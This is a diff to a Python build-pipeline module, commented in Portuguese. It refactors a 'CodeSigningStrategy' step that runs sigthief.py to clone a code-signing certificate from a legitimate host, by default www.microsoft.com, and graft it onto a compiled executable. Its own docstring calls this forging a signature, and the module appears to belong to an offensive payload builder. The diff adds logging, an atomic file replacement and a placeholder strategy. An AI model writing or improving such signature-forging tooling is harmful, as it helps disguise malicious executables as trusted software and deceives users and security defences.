@@ -1,64 +1,65 @@
-# strategies/signature.py
+# strategies/signing.py
 
 import sys
 import subprocess
 import shutil
 from pathlib import Path
 from .base import BuildStrategy, BuildContext, SignatureStrategy
-from rich.console import Console # Importa diretamente do rich
-console = Console() # Cria uma instância local
+from rich.console import Console
+
+console = Console()
 
 
-class CodeSigningStrategy(SignatureStrategy): # <-- CORREÇÃO: Herda de BaseStrategy
+class CodeSigningStrategy(SignatureStrategy):
     """
-    Forja uma assinatura de código em um executável usando um script externo (ex: CarbonCopy/sigthief).
+    Forja uma assinatura de código em um executável usando sigthief.py.
     Clona um certificado de um host legítimo para assinar o artefato.
     """
-    
+
     def execute(self, context: BuildContext) -> BuildContext:
-        # --- Verificações Iniciais ---
+
         if not context.config.get('sign_executable', False):
-            # Esta etapa foi desabilitada pelo usuário.
-            return context
-        
-        # Verifica se o artefato da compilação anterior realmente existe
-        if not context.final_artifact_path or not context.final_artifact_path.exists():
-            console.print("[warning]Artefato final não encontrado. Pulando etapa de assinatura.[/warning]")
             return context
 
-        console.print("[info]Iniciando forjamento de assinatura de código...[/info]")
-        
-        # --- Localização do Script de Assinatura ---
-        # Usa sys.executable para garantir que o mesmo ambiente Python seja usado.
-        python_executable = sys.executable
-        # Assume que o script de assinatura está na raiz do projeto.
-        base_dir = Path(__file__).parent.parent
-        # Renomeado para ser mais genérico, sigthief.py é o nome comum da ferramenta.
-        signing_script = base_dir / "sigthief.py" 
-        
-        if not signing_script.exists():
-            console.print(f"[error]Script de assinatura '{signing_script.name}' não encontrado em '{base_dir}'.")
-            console.print("[warning]Pulando etapa de assinatura. Baixe o script e coloque-o na raiz do projeto.[/warning]")
+        if not context.final_artifact_path or not context.final_artifact_path.exists():
+            console.print(
+                "[bold yellow]  → AVISO: Artefato final não encontrado. "
+                "Pulando etapa de assinatura.[/bold yellow]"
+            )
+            context.log("CodeSigning: pulado — artefato não encontrado.")
             return context
-        
-        # --- Preparação dos Parâmetros ---
+
+        console.print("[bold cyan]  → Iniciando forjamento de assinatura de código...[/bold cyan]")
+
+        python_executable = sys.executable
+        base_dir = Path(__file__).parent.parent
+        signing_script = base_dir / "sigthief.py"
+
+        if not signing_script.exists():
+            console.print(
+                f"[bold yellow]  → AVISO: '{signing_script.name}' não encontrado em '{base_dir}'. "
+                f"Pulando assinatura.[/bold yellow]"
+            )
+            context.log("CodeSigning: pulado — sigthief.py não encontrado.")
+            return context
+
         source_host = context.config.get('sign_host', 'www.microsoft.com')
         original_path = context.final_artifact_path
-        # Cria um nome de arquivo temporário para o executável assinado
         signed_path = original_path.with_suffix(f"{original_path.suffix}.signed")
-        
-        # --- Construção e Execução do Comando ---
+
         command = [
             python_executable,
             str(signing_script),
-            '-t', str(original_path), # Arquivo alvo
-            '-r', str(source_host),   # Host remoto para clonar certificado
-            '-o', str(signed_path)    # Arquivo de saída
+            '-t', str(original_path),
+            '-r', str(source_host),
+            '-o', str(signed_path)
         ]
-        
-        console.print(f"[info]Clonando certificado de '{source_host}' e aplicando em '{original_path.name}'...[/info]")
-        console.print(f"[info]Comando: {' '.join(command)}[/info]")
-        
+
+        console.print(
+            f"[bold cyan]  → Clonando certificado de '{source_host}' "
+            f"para '{original_path.name}'...[/bold cyan]"
+        )
+
         try:
             result = subprocess.run(
                 command,
@@ -66,38 +67,47 @@ class CodeSigningStrategy(SignatureStrategy): # <-- CORREÇÃO: Herda de BaseStr
                 text=True,
                 encoding='utf-8',
                 errors='ignore',
-                timeout=90 # Aumentado para 90s para redes lentas
+                timeout=90
             )
-            
+
             if result.returncode != 0:
-                # Se falhar, imprime a saída para ajudar na depuração
-                error_output = result.stdout + "\n" + result.stderr
-                raise RuntimeError(f"O script de assinatura falhou:\n{error_output}")
-            
-            # --- Substituição e Limpeza ---
-            # Substitui o executável original pelo novo, agora assinado
-            original_path.unlink()
-            shutil.move(str(signed_path), str(original_path))
-            
-            console.print(f"[success]Assinatura de '{source_host}' aplicada com sucesso![/success]")
-            
-            return context
-            
+                error_output = (result.stdout + "\n" + result.stderr).strip()
+                raise RuntimeError(f"sigthief falhou:\n{error_output}")
+
+            # Substituição atômica — evita race condition do unlink+move
+            signed_path.replace(original_path)
+
+            context.config['signing_applied'] = True
+            context.log(f"CodeSigning: assinatura de '{source_host}' aplicada com sucesso.")
+            console.print(
+                f"[bold green]  → Assinatura de '{source_host}' aplicada com sucesso![/bold green]"
+            )
+
         except subprocess.TimeoutExpired:
-            console.print("[error]Timeout ao executar o script de assinatura (>90s). Verifique sua conexão.[/error]")
-            # Retorna o contexto sem a assinatura para não quebrar o build
-            return context
+            console.print(
+                "[bold yellow]  → AVISO: Timeout ao assinar (>90s). "
+                "Verifique sua conexão. Continuando sem assinatura.[/bold yellow]"
+            )
+            context.config['signing_applied'] = False
+            context.log("CodeSigning: falhou por timeout.")
+
         except Exception as e:
-            console.print(f"[warning]Erro ao assinar o executável: {e}[/warning]")
-            console.print("[warning]Continuando o build sem a assinatura.[/warning]")
-            # Garante que o arquivo temporário .signed seja removido se existir
+            console.print(
+                f"[bold yellow]  → AVISO: Erro ao assinar: {e}. "
+                f"Continuando sem assinatura.[/bold yellow]"
+            )
+            context.config['signing_applied'] = False
+            context.log(f"CodeSigning: falhou — {e}")
             if signed_path.exists():
                 signed_path.unlink()
-            return context
 
-# Adicione aqui outras estratégias de assinatura se necessário, como NullSignature
+        return context
+
+
 class NullSignature(BuildStrategy):
-    """Uma estratégia que não faz nada, usada como placeholder."""
+    """Estratégia placeholder — não realiza nenhuma assinatura."""
+
     def execute(self, context: BuildContext) -> BuildContext:
-        # console.print("[info]Estratégia de assinatura nula. Nenhuma ação realizada.[/info]")
+        console.print("[dim]  → Assinatura: nenhuma (NullSignature).[/dim]")
+        context.log("NullSignature: nenhuma ação realizada.")
         return context
